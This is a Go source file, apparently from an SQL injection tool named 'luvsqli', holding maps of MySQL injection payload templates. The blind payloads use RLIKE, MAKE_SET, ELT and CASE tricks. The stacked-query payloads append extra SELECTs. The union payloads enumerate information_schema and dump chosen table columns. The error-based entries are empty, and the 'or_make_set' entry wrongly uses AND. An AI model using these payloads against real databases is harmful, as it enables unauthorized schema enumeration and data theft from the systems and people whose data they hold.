package luvsqli

//MySqlBlind is a map of MySql Blind SQL Injection Attack Vectors
var MySqlBlind = map[string]string{
	"rlike":        "%s RLIKE (SELECT (CASE WHEN (%s) THEN 1 ELSE 0x20 END))%s",
	"and_make_set": "%s AND MAKE_SET(1111=8104,%s)%s",
	"or_make_set":  "%s AND MAKE_SET(1111=8104,%s)%s",
	"and_elt":      "%s AND ELT(1111=8104,%s)%s",
	"or_elt":       "%s OR ELT(1111=8104,%s)%s",
	"and_bool_int": "%s AND (%s)*1%s",
	"or_bool_int":  "%s OR (%s)*1%s",
	"make_set_rep": "%sMAKE_SET(1111=8104,%s)%s",
	"elt_rep":      "%sELT(7944=2817,%s)%s",
	"bool_int_rep": "%s(%s)*1%s",
	"stacked":      "%s;SELECT (CASE WHEN (%s) THEN 1 ELSE 1*(SELECT 1 FROM INFORMATION_SCHEMA.PLUGINS) END)#",
}

//MySqlError is a map of MySql Error SQL Injection Attack Vectors
var MySqlError = map[string]string{
	"bigint":          "",
	"exp":             "",
	"gtid":            "",
	"json":            "",
	"extract":         "",
	"extract_generic": "",
	"xml":             "",
	"floor_schema":    "",
	"floor_union":     "",
	"floor_generic":   "",
}

//MySqlStacked is a map of MySql Stacked SQL Injection Attack Vectors
var MySqlStacked = map[string]string{
	"basic": "%s;SELECT %s%s",
	"query": "%s;(SELECT * FROM (SELECT(%s))CWTq)%s",
}

//MySqlUnion is a map of MySql Union SQL Injection Attack Vectors
var MySqlUnion = map[string]string{
	"get_schema": "(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and(0x00)in (@a:=concat(@a,0x%s,table_schema,0x%s,table_name,0x%s,column_name,0x%s))))a)",
	"dump":       "(select (@a) from (select(@a:=0x00),(select (@a) from (%s.%s) where(0x00)in (@a:=concat(@a,0x%s,%s,0x%s))))a)",
}
